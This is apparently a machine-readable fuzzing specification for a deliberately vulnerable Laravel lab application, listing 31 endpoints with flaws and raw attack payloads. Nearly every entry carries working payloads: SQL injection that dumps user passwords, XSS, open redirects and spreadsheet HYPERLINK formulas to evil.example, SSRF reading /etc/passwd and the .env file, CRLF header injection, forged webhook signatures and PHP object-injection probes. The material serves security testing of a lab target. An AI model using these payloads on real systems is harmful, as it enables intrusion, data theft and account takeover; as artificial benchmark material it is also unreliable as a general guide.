## Machine-readable spec (JSON)

The same 31 entries in the requested JSON format.

```json
[
  {
    "target_endpoint": "POST /login.php",
    "source_file_line": "app/Http/Controllers/LabgenPla0001Controller.php:23",
    "developer_assumption": "username is a plain account name typed into the login form; the password clause added by ->where() keeps the check tied to the right account.",
    "human_ui_context": "Nav 'Log in' -> GET /login.php form -> submit username/password. On success the session gets user_id and the browser is redirected to /profile.php.",
    "logical_flaw": "username is concatenated into whereRaw(\"username = '...'\") with no escaping. Laravel does not wrap raw wheres in parentheses, so an OR in username outranks the appended `and password = ?`. password goes through md5() with no type check: an array throws a TypeError (500) and a missing value gives md5('').",
    "fuzzing_strategy": "Delimiter injection into a single-quoted string; operator-precedence abuse against the appended AND clause; comment truncation that also hides the bound placeholder (tests how PDO counts placeholders); type confusion on password.",
    "raw_payloads": [
      "username=' OR 1=1 OR '&password=x",
      "username=admin' OR '1'='1' OR '&password=x",
      "username=admin'-- -&password=x",
      "username=admin'#&password=x",
      "username='&password=x",
      "username=admin&password[]=x"
    ]
  },
  {
    "target_endpoint": "GET /product.php?id=",
    "source_file_line": "app/Http/Controllers/LabgenRplProductController.php:20",
    "developer_assumption": "id is a positive integer taken from a product link.",
    "human_ui_context": "Nav 'Product' or a product link from /products.php -> /product.php?id=N.",
    "logical_flaw": "Raw concatenation in an unquoted numeric context (\"... WHERE id = \" . $id) with no cast or validation. A query('id') array becomes the string 'Array' plus a warning that Laravel turns into an ErrorException.",
    "fuzzing_strategy": "Numeric-context injection (no quote to balance): boolean, UNION against the 6-column products table, time-based, and error-based probes; integer overflow; array type confusion.",
    "raw_payloads": [
      "0 OR 1=1",
      "-1 UNION SELECT 1,username,password,email,full_name,6 FROM users-- -",
      "1 AND SLEEP(3)",
      "1 AND extractvalue(1,concat(0x7e,version()))",
      "9223372036854775808",
      "1'",
      "id[]=1"
    ]
  },
  {
    "target_endpoint": "GET /blog_post.php?id=",
    "source_file_line": "app/Http/Controllers/LabgenRplBlogpostController.php:20",
    "developer_assumption": "id is an integer post id taken from the blog index link.",
    "human_ui_context": "Nav 'Blog' -> /blog_post.php (defaults to id=1) -> post links.",
    "logical_flaw": "Same raw numeric concatenation as product.php against posts (5 columns). APP_DEBUG=false hides DB errors, so the only oracles are boolean/content differences and timing.",
    "fuzzing_strategy": "Boolean-blind and time-blind differential pairs; UNION width probing against 5 columns.",
    "raw_payloads": [
      "1 AND 1=1",
      "1 AND 1=2",
      "1 AND IF(SUBSTR((SELECT password FROM users WHERE id=1),1,1)='0',SLEEP(3),0)",
      "-1 UNION SELECT 1,username,password,email,'2020-01-01' FROM users-- -",
      "1 ORDER BY 6-- -"
    ]
  },
  {
    "target_endpoint": "GET /search.php?q=",
    "source_file_line": "app/Http/Controllers/LabgenPlRp0001Controller.php:25",
    "developer_assumption": "q is a short free-text search term from the search box.",
    "human_ui_context": "Nav 'Search' -> type into the search box -> GET /search.php?q=term.",
    "logical_flaw": "q is spliced into whereRaw(\"name LIKE '%\" . $q . \"%'\"). There is no quote escaping, and LIKE wildcards (% and _) are not escaped either.",
    "fuzzing_strategy": "String-delimiter injection inside a LIKE pattern; UNION against the 6-column products table; wildcard semantics; backslash escape-of-quote.",
    "raw_payloads": [
      "%' OR '1'='1",
      "%' AND SLEEP(3)-- -",
      "zzz' UNION SELECT 1,username,password,email,full_name,6 FROM users-- -",
      "\\",
      "_",
      "%"
    ]
  },
  {
    "target_endpoint": "POST /edit_profile.labgen-plrp-0401.php?user=  ->  GET /profile.php?user=",
    "source_file_line": "app/Http/Controllers/LabgenPlrp0401WriteController.php:24-25 (sink: resources/views/cells/labgen-plrp-0401.blade.php:11)",
    "developer_assumption": "Only the logged-in user edits their own bio. The hidden form field `user` identifies them, and bio is plain text.",
    "human_ui_context": "GET /edit_profile.labgen-plrp-0401.php -> textarea 'bio' + hidden input user -> POST -> redirect to /profile.php, which renders the bio.",
    "logical_flaw": "No authentication or ownership check. The target user comes from $request->query('user') with an (int) cast, but the form sends `user` in the POST body, so every UI submission writes user 1 (admin). bio has no type or length check and is rendered with {!! !!}. CSRF is disabled globally (bootstrap/app.php:27), so a cross-site POST can make this write. The same users.bio column is also rendered raw at /cell/labgen-pl-0005 (resources/views/cells/labgen-pl-0005.blade.php:9).",
    "fuzzing_strategy": "Stored-markup injection; IDOR by query-vs-body parameter source confusion; (int)-cast truncation; array type confusion; TEXT length overflow (65,535 bytes) in strict mode.",
    "raw_payloads": [
      "bio=<img src=x onerror=alert(document.domain)>",
      "bio=<svg onload=alert(1)>",
      "?user=2  body: bio=<details open ontoggle=alert(1)>",
      "?user=2abc  (int cast -> 2)",
      "?user=999999  (findOrFail -> 404)",
      "bio[]=x",
      "bio=<70000 x 'A'>"
    ]
  },
  {
    "target_endpoint": "GET /reviews.php#author=",
    "source_file_line": "resources/views/cells/labgen-plrp-dom-0001.blade.php:9-12",
    "developer_assumption": "The author name in the fragment is the reviewer's display name, and the server never sees it.",
    "human_ui_context": "Nav 'Reviews' -> a thank-you link carrying #author=Name.",
    "logical_flaw": "location.hash is matched by /author=([^&]*)/, passed through decodeURIComponent, and concatenated into innerHTML. A malformed percent sequence throws an uncaught URIError, which aborts the script.",
    "fuzzing_strategy": "Client-only source (no server log or WAF visibility); HTML injection via innerHTML (a <script> element will not run, so event-handler payloads are needed); encoding robustness.",
    "raw_payloads": [
      "#author=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E",
      "#author=<svg onload=alert(1)>",
      "#author=<script>alert(1)</script>",
      "#author=%E0%A4%A",
      "#x=1&author=<img src=x onerror=alert(2)>"
    ]
  },
  {
    "target_endpoint": "GET /feedback.php?ref=",
    "source_file_line": "resources/views/cells/labgen-plrp-dom-0002.blade.php:9-11",
    "developer_assumption": "ref is a referral tag from a marketing link.",
    "human_ui_context": "Nav 'Feedback' -> arrive via a link carrying ?ref=source.",
    "logical_flaw": "URLSearchParams.get('ref') goes straight into innerHTML. The server ignores ref, so server-side oracles see nothing.",
    "fuzzing_strategy": "Client-side innerHTML injection; this needs a browser oracle, not response diffing.",
    "raw_payloads": [
      "<img src=x onerror=alert(document.domain)>",
      "<iframe srcdoc=\"<script>parent.alert(1)</script>\">",
      "<a href=javascript:alert(1)>x</a>"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0001?id=",
    "source_file_line": "app/Http/Controllers/LabgenPl0001Controller.php:20",
    "developer_assumption": "id is a product integer, consumed as a JSON API.",
    "human_ui_context": "Listed on /catalog (all GET routes are enumerated there). No form; a direct link.",
    "logical_flaw": "Raw numeric concatenation, and every selected column is echoed back as JSON, which gives a clean UNION oracle.",
    "fuzzing_strategy": "UNION column-count probing with JSON diffing.",
    "raw_payloads": [
      "-1 UNION SELECT 1,2,3,4,5,6",
      "-1 UNION SELECT 1,username,password,email,full_name,address FROM users",
      "1 OR 1=1"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0007?sort=",
    "source_file_line": "app/Http/Controllers/LabgenPl0007Controller.php:24",
    "developer_assumption": "sort is a column name chosen from a sort dropdown.",
    "human_ui_context": "Listed on /catalog; in a real UI this would be a 'sort by' select.",
    "logical_flaw": "orderByRaw($sort) with no allowlist; the safe twin labgen-pl-0008 uses a regex. Errors are hidden, so ordering differences and timing are the oracles.",
    "fuzzing_strategy": "ORDER BY-context injection: conditional ordering, subquery-driven timing, error functions, and a null/empty sort.",
    "raw_payloads": [
      "IF(1=1,id,name)",
      "IF((SELECT SUBSTR(password,1,1) FROM users WHERE id=1)='0',id,name)",
      "id,(SELECT SLEEP(2))",
      "extractvalue(1,concat(0x7e,(SELECT user())))",
      "",
      "sort[]=id"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0009?sort=",
    "source_file_line": "app/Http/Controllers/LabgenPl0009Controller.php:24",
    "developer_assumption": "sort is a column name. The query filters on products.active.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "Raw ORDER BY concatenation. In the containerized lab, lab/sql/schema.sql's products table has no `active` column, so every request is a 500. With APP_DEBUG=false the only oracle is FzlCoverage's db_error (send header X-Fzl-Cov; MariaDB reports a syntax error before an unknown-column error).",
    "fuzzing_strategy": "Parser-precedence oracle: a syntax-error payload against a well-formed one, compared through db_error in the coverage file.",
    "raw_payloads": [
      "id",
      "id'",
      "(SELECT 1 FROM",
      "id LIMIT 1"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0011?alias=  (and /cell/labgen-pl-0013)",
    "source_file_line": "app/Http/Controllers/LabgenPl0011Controller.php:20; LabgenPl0013Controller.php:25",
    "developer_assumption": "alias is a short SQL table alias such as i2.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "An identifier is concatenated into the query in three places. There is no `inventory` table in lab/sql/schema.sql, so the live lab always returns 500; only the X-Fzl-Cov db_error oracle separates syntax errors from the missing table.",
    "fuzzing_strategy": "Identifier-context injection that must stay syntactically valid at all three insertion points.",
    "raw_payloads": [
      "i2",
      "i2 JOIN users u ON 1=1 -- ",
      "`i2`",
      "i2;",
      ""
    ]
  },
  {
    "target_endpoint": "POST /cell/labgen-pl-0003",
    "source_file_line": "app/Http/Controllers/LabgenPl0003Controller.php:23-24",
    "developer_assumption": "A JSON login probe that takes username and password.",
    "human_ui_context": "Hidden: POST-only, so it is not listed on /catalog (which shows GET routes only) and has no form.",
    "logical_flaw": "Raw whereRaw on username, but the bound clause filters on a `password_hash` column that does not exist in users (the column is `password`), so every well-formed query fails in the live lab.",
    "fuzzing_strategy": "Same delimiter injection as /login.php, read through the X-Fzl-Cov db_error oracle: syntax error versus unknown column.",
    "raw_payloads": [
      "username='&password=x",
      "username=' OR 1=1 OR '&password=x",
      "username=admin&password=x"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0015?url=",
    "source_file_line": "resources/views/cells/labgen-pl-0015.blade.php:6 (controller LabgenPl0015Controller.php:19)",
    "developer_assumption": "url is a share target.",
    "human_ui_context": "Listed on /catalog; the page shows a 'continue' link.",
    "logical_flaw": "Rendered raw inside href=\"javascript:...\", so the value is JavaScript source and can also close the attribute.",
    "fuzzing_strategy": "JS-context execution with no breakout, plus attribute breakout.",
    "raw_payloads": [
      "alert(document.domain)",
      "\"><svg onload=alert(1)>",
      "void(fetch('/profile.php'))"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0016?url=",
    "source_file_line": "resources/views/cells/labgen-pl-0016.blade.php:6 (controller LabgenPl0016Controller.php:21)",
    "developer_assumption": "e() makes the value safe.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "HTML-entity escaping is applied in a javascript: URL context, where everything after 'javascript:' is already code. The entities it does emit (&#039;) are decoded by the HTML parser before the JS runs.",
    "fuzzing_strategy": "Escaping-context mismatch: quote-free payloads, plus entity round-trip.",
    "raw_payloads": [
      "alert(document.domain)",
      "alert(String.fromCharCode(88,83,83))",
      "alert(`x`)",
      "alert('x')"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0017?url=  (secure twin)",
    "source_file_line": "app/Http/Controllers/LabgenPl0017Controller.php:21 (sink: resources/views/cells/labgen-pl-0017.blade.php:6)",
    "developer_assumption": "The http/https scheme allowlist neutralizes the javascript: sink. safety_matrix.yaml marks url_scheme_allowlist as `neutralises` for url_javascript_scheme, so this cell is expected to be labeled secure.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "The allowlisted value is still printed raw ({!! !!}) after a hard-coded 'javascript:' prefix. (1) parse_url() still reports scheme https for `https://a/\"><svg ...>`, so a quote closes the attribute. (2) `https:` is a valid JS label and `//...` a comment, so a percent-encoded newline (decoded by the browser in the javascript: URL) starts executable code. Both checked: PHP 8.3 parse_url returns 'https' for both shapes. This is likely a ground-truth mislabel.",
    "fuzzing_strategy": "Allowlist-passing polyglots: scheme-valid attribute breakout, and JS label/comment newline smuggling (double-encoded so PHP decodes once and the browser once).",
    "raw_payloads": [
      "https://a/\"><svg onload=alert(document.domain)>",
      "https://x/%250aalert(document.domain)",
      "https://x/%250dalert(1)",
      "https://a/\" onmouseover=\"alert(1)"
    ]
  },
  {
    "target_endpoint": "GET /cell/labgen-pl-0018?theme=  /  GET /cell/labgen-pl-0019?theme=",
    "source_file_line": "resources/views/cells/labgen-pl-0018.blade.php:6; labgen-pl-0019.blade.php:6 (e() applied at LabgenPl0019Controller.php:21)",
    "developer_assumption": "theme is a token such as 'dark'. For 0019, e() is assumed sufficient.",
    "human_ui_context": "Listed on /catalog; in a real UI this would be a theme toggle.",
    "logical_flaw": "Output goes into an unquoted attribute (data-theme={!! $value !!}). e() does not encode spaces, '/' or '=', so new attributes can be added without '<' or quotes. 0018 is also raw, so tag breakout works there.",
    "fuzzing_strategy": "Unquoted-attribute whitespace and slash delimiter injection; quote-free event handlers.",
    "raw_payloads": [
      "x onmouseover=alert(1)",
      "x/onmouseover=alert(1)",
      "x style=display:block;width:100vw;height:100vh onmouseover=alert(document.domain)",
      "x><svg onload=alert(1)>",
      "x%09onmouseover=alert(1)"
    ]
  },
  {
    "target_endpoint": "GET /search.labgen-pl-rp-0003.php?q=  /  GET /search.labgen-pl-rp-0005.php?q=",
    "source_file_line": "resources/views/cells/labgen-pl-rp-0003.blade.php:9; labgen-pl-rp-0005.blade.php:7",
    "developer_assumption": "q is echoed back as a friendly 'you searched for' line or as the prefilled input value.",
    "human_ui_context": "Listed on /catalog; these are the twin URLs carrying /search.php's reflected-XSS shapes (PFF-0003 is exempted at the real URL).",
    "logical_flaw": "Raw reflection: 0003 into the HTML body, 0005 into a double-quoted value attribute.",
    "fuzzing_strategy": "Body-context tag injection; quoted-attribute breakout.",
    "raw_payloads": [
      "<img src=x onerror=alert(1)>",
      "\"><svg onload=alert(1)>",
      "\" autofocus onfocus=alert(1) x=\"",
      "</div><script>alert(1)</script>"
    ]
  },
  {
    "target_endpoint": "GET /booking/continue?return_to=",
    "source_file_line": "app/Http/Controllers/LabgenBc0001Controller.php:22",
    "developer_assumption": "return_to is a same-site path set by the booking flow.",
    "human_ui_context": "Listed on /catalog; in a booking flow it is the 'continue' redirect after login.",
    "logical_flaw": "redirect($return_to) with no check, so any absolute or protocol-relative URL is accepted.",
    "fuzzing_strategy": "Absolute URL, protocol-relative, backslash-normalization, and scheme confusion.",
    "raw_payloads": [
      "https://evil.example/",
      "//evil.example/",
      "/\\evil.example",
      "javascript:alert(1)",
      "%0d%0aSet-Cookie:x=1"
    ]
  },
  {
    "target_endpoint": "GET /comments/share?next=",
    "source_file_line": "app/Http/Controllers/LabgenCf0005Controller.php:40-41",
    "developer_assumption": "next is a same-site path.",
    "human_ui_context": "Listed on /catalog (CircleFeed share flow).",
    "logical_flaw": "header(\"Location: \" . $next) with no check, so it is an open redirect. CRLF response splitting is blocked by PHP 8.3's header() ('new line detected', verified), as the in-code note concedes. `exit` skips the rest of the Laravel middleware stack, so FzlCoverage never writes a coverage file for this route (a grey-box blind spot).",
    "fuzzing_strategy": "Open-redirect targets, plus CRLF probes as a negative control: expect 200 with no Location header and a PHP warning.",
    "raw_payloads": [
      "https://evil.example/",
      "//evil.example/",
      "/x%0d%0aSet-Cookie:%20pwn=1",
      "/x%0aX-Injected:%201"
    ]
  },
  {
    "target_endpoint": "GET /comments/share.labgen-cf-0006?next=  (secure twin)",
    "source_file_line": "app/Http/Controllers/LabgenCf0006Controller.php:24-25,34",
    "developer_assumption": "Rejecting control characters and requiring a leading '/' makes the target same-site.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "The regex #^/[A-Za-z0-9/_\\-\\.]*$# accepts '//evil.example' (verified), and redirect()->away() emits it verbatim, giving a protocol-relative open redirect. The labeled class (header injection) is correctly closed; open redirect is not.",
    "fuzzing_strategy": "Allowlist-conformant protocol-relative URL.",
    "raw_payloads": [
      "//evil.example",
      "//evil.example/path",
      "//127.0.0.1.nip.io/"
    ]
  },
  {
    "target_endpoint": "GET /extranet/export?label=",
    "source_file_line": "app/Http/Controllers/LabgenBc0003Controller.php:23",
    "developer_assumption": "label is a plain booking label exported to CSV.",
    "human_ui_context": "Listed on /catalog (Booking extranet export).",
    "logical_flaw": "label is written into CSV with no formula neutralization and no quoting, so commas and newlines also inject cells and rows.",
    "fuzzing_strategy": "Spreadsheet-formula injection; CSV delimiter and row injection.",
    "raw_payloads": [
      "=1+1",
      "=HYPERLINK(\"http://evil.example\",\"x\")",
      "@SUM(1+1)",
      "x,=1+1",
      "x%0a=1+1,0"
    ]
  },
  {
    "target_endpoint": "GET /extranet/export.labgen-bc-0004?label=  (secure twin)",
    "source_file_line": "app/Http/Controllers/LabgenBc0004Controller.php:28",
    "developer_assumption": "A leading-character check (^\\s*[=+\\-@\\t\\r]) neutralizes formulas.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "Only the start of the whole string is checked, and no CSV quoting is done. A comma starts a new cell and a newline starts a new row, and either can then begin with '='. Verified: both 'safe,=1+1' and 'safe\\n=...' pass unprefixed.",
    "fuzzing_strategy": "Delimiter injection to move the formula away from the checked position.",
    "raw_payloads": [
      "safe,=1+1",
      "safe%0a=HYPERLINK(\"http://evil.example\",\"x\")",
      "safe%0d%0a@SUM(1+1)",
      "\"safe\",=1+1"
    ]
  },
  {
    "target_endpoint": "POST /booking/checkout  /  POST /booking/checkout.labgen-bc-0006",
    "source_file_line": "app/Http/Controllers/LabgenBc0005Controller.php:23; LabgenBc0006Controller.php:25",
    "developer_assumption": "0005: amount comes from the priced UI. 0006: room_type is one of the dropdown values.",
    "human_ui_context": "Hidden: POST-only, with no GET form, so it is absent from /catalog.",
    "logical_flaw": "0005 trusts a client-supplied price (no sign, range or type check). 0006 indexes a PHP array with $request->input('room_type'); an array value throws TypeError 'Cannot access offset of type array' (verified), and ?? does not catch it. There is no `bookings` table in lab/sql/schema.sql, so 0005 always returns 500 in the live lab; use X-Fzl-Cov to separate db_fault from TypeError.",
    "fuzzing_strategy": "Business-logic price tampering; numeric boundaries; array type confusion on a dictionary lookup.",
    "raw_payloads": [
      "amount=-129.00",
      "amount=0.001",
      "amount=1e308",
      "amount[]=1",
      "room_type[]=suite",
      "room_type=penthouse  (falls back to 89.00 silently)"
    ]
  },
  {
    "target_endpoint": "GET /photos/view?id=",
    "source_file_line": "app/Http/Controllers/LabgenCf0001Controller.php:35",
    "developer_assumption": "Users only open their own photos from their gallery.",
    "human_ui_context": "Log in via /login.php (sets session user_id) -> /photos/view?id=N.",
    "logical_flaw": "Photo::where('id', $id) has no owner_id filter, so any authenticated user can read any photo (IDOR); the twin cf-0002 adds the filter. The photos table exists only as a Laravel migration that the image never runs, so the live lab returns 500.",
    "fuzzing_strategy": "Sequential id enumeration across two sessions; array and boolean type confusion.",
    "raw_payloads": [
      "1",
      "2",
      "0",
      "id[]=2",
      "-1"
    ]
  },
  {
    "target_endpoint": "POST /groups/webhook  /  POST /webhooks/events",
    "source_file_line": "app/Http/Controllers/LabgenCf0003Controller.php:22,32; LabgenHhb0001Controller.php:22,32",
    "developer_assumption": "Only the integration partner can produce a valid X-Signature.",
    "human_ui_context": "Hidden: server-to-server only, with no UI.",
    "logical_flaw": "The HMAC secret is hard-coded in the controller, so signatures can be forged. The comparison is a loose `!=`; it only juggles when both sides are numeric strings, so a '0e...' magic-hash collision is a negligible-probability probe, not a practical bypass. The twins use hash_equals.",
    "fuzzing_strategy": "Forged signatures computed with the leaked secret; empty, missing and magic-hash signature probes.",
    "raw_payloads": [
      "body={\"event\":\"ping\"}  X-Signature: 27fe49f3c797d5932b0dd796b27f50e694bde40decf32646da6fbc7929720f4c  (circlefeed)",
      "body={\"event\":\"ping\"}  X-Signature: 3b4efbee8164e7710e0f748603581c372016ab3c1b39fee039ee8eb9476440df  (huddlehub)",
      "body=<empty>  X-Signature: d308d462d282f8a16e65e650d10c74e68fe96fb12d7e9a13764ce2e427a5f80e  (circlefeed)",
      "X-Signature: 0e0",
      "X-Signature: (absent)"
    ]
  },
  {
    "target_endpoint": "GET /messages/unfurl?url=",
    "source_file_line": "app/Http/Controllers/LabgenHhb0003Controller.php:25,35",
    "developer_assumption": "url is a public http(s) link pasted into chat.",
    "human_ui_context": "Listed on /catalog (HuddleHub link unfurl).",
    "logical_flaw": "file_get_contents($url) with any scheme and no host restriction, and the first 200 bytes are reflected back. An empty url throws ValueError 'Path cannot be empty' (verified; @ does not suppress it), giving a 500. An array url gives a TypeError.",
    "fuzzing_strategy": "Scheme confusion (file://, php://filter); internal-host SSRF; empty and array type confusion.",
    "raw_payloads": [
      "file:///etc/passwd",
      "php://filter/convert.base64-encode/resource=/var/www/html/.env",
      "http://127.0.0.1/up",
      "http://db:3306/",
      "",
      "url[]=x"
    ]
  },
  {
    "target_endpoint": "GET /messages/unfurl.labgen-hhb-0004?url=  (secure twin)",
    "source_file_line": "app/Http/Controllers/LabgenHhb0004Controller.php:32-37",
    "developer_assumption": "Resolving the host once and rejecting private or reserved IPs prevents SSRF.",
    "human_ui_context": "Listed on /catalog.",
    "logical_flaw": "Time-of-check vs time-of-use: gethostbyname() resolves once (IPv4 only) and file_get_contents() resolves again. The http wrapper also follows redirects by default (follow_location=1), so a public URL can 302 to 127.0.0.1. Both need a lab-controlled redirector or a rebinding DNS name.",
    "fuzzing_strategy": "Redirect-chain bypass; DNS-rebinding; numeric-host normalization as controls.",
    "raw_payloads": [
      "http://<lab-redirector>/302?to=http://127.0.0.1/up",
      "http://<rebind-name-public-then-127.0.0.1>/up",
      "http://0x7f000001/",
      "http://[::1]/",
      "HTTP://127.0.0.1/"
    ]
  },
  {
    "target_endpoint": "GET /integrations/outgoing-webhook?triggerWord=",
    "source_file_line": "app/Http/Controllers/LabgenHhb0005Controller.php:27",
    "developer_assumption": "triggerWord is a single keyword.",
    "human_ui_context": "Listed on /catalog (HuddleHub outgoing-webhook config).",
    "logical_flaw": "triggerWord is concatenated into a raw stream_context header block, so CR/LF injects outbound request headers. The default target, hooks.example.invalid, never resolves; set HUDDLEHUB_WEBHOOK_URL to a lab capture listener to observe the result. The twin hhb-0006 (Laravel Http) rejects CR/LF with a 400, which makes a negative control.",
    "fuzzing_strategy": "CRLF delimiter injection into an outbound HTTP header block; header-to-body smuggling.",
    "raw_payloads": [
      "x%0d%0aX-Injected:%201",
      "x%0d%0aHost:%20internal.lab",
      "x%0d%0aContent-Length:%200%0d%0a%0d%0aGET%20/smuggled%20HTTP/1.1",
      "x%0aX-LF-Only:%201"
    ]
  },
  {
    "target_endpoint": "GET /settings/preferences  (Cookie: pref=)",
    "source_file_line": "app/Http/Controllers/LabgenCf0007Controller.php:34,38",
    "developer_assumption": "pref is a cookie the app itself set.",
    "human_ui_context": "Listed on /catalog (CircleFeed settings). The cookie is set client-side.",
    "logical_flaw": "unserialize() runs on base64 cookie bytes. EncryptCookies is explicitly disabled for 'pref' (bootstrap/app.php:38), and allowed_classes is not restricted. The response leaks get_class() of the result, which gives a class-instantiation oracle. The serialized value b:0; is reported as unserialize_failed (a false-negative oracle).",
    "fuzzing_strategy": "Object injection: class-instantiation probes, then gadget-chain reachability (phpggc Laravel/* chains against the installed vendor tree); malformed-base64 and type-boundary probes.",
    "raw_payloads": [
      "Tzo4OiJzdGRDbGFzcyI6MTp7czoxOiJhIjtpOjE7fQ==",
      "YToxOntzOjU6InRoZW1lIjtzOjQ6ImRhcmsiO30=",
      "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MDp7fQ==",
      "YjowOw==",
      "!!!notbase64"
    ]
  },
  {
    "target_endpoint": "POST /example/account_settings",
    "source_file_line": "app/Http/Controllers/LabgenMa0003Controller.php:37",
    "developer_assumption": "The body carries only display_name, bio and avatar_url from the settings form.",
    "human_ui_context": "GET /example/account_settings (client page) -> its script POSTs the fields.",
    "logical_flaw": "Every request key becomes an UPDATE column name. But $request->user() is always null (the app stores session user_id itself and never calls Auth::login), so the WHERE becomes `id IS NULL` and no rows change. Unknown keys still raise 'Unknown column', which makes a 200-vs-500 users-schema enumeration oracle. display_name and avatar_url themselves are not users columns.",
    "fuzzing_strategy": "Key-space fuzzing (column enumeration); identifier-quoting robustness on keys; nested-array values.",
    "raw_payloads": [
      "{\"bio\":\"x\"}",
      "{\"password\":\"x\",\"username\":\"admin\"}",
      "{\"is_admin\":1}",
      "{\"id`=1,`bio\":\"x\"}",
      "{\"bio\":{\"a\":1}}"
    ]
  },
  {
    "target_endpoint": "POST /register.php",
    "source_file_line": "app/Http/Controllers/LabgenPla0003Controller.php:24,41-47",
    "developer_assumption": "The form supplies username (50 chars or fewer), email, password and full_name, all as strings.",
    "human_ui_context": "Nav 'Register' -> GET /register.php form -> POST.",
    "logical_flaw": "No server-side validation of presence, type or length. A missing password gives md5(null) = md5(''), so an empty-password account can then log in with an empty password. VARCHAR(50/120) overflow in strict mode gives a 500. There is a check-then-insert race against the UNIQUE username (500 on collision). An array username is flattened by where() but breaks the insert.",
    "fuzzing_strategy": "Null/omitted fields; length strain at 50/51 and 120/121; parallel duplicate registration; array type confusion.",
    "raw_payloads": [
      "username=nopw&email=a@b.c&full_name=x  (password omitted)",
      "username=<51 x 'a'>&email=a@b.c&password=x",
      "email=<121 x 'a'>&username=u2&password=x",
      "username[]=admin&password=x",
      "20 concurrent POSTs with username=race1"
    ]
  }
]
```
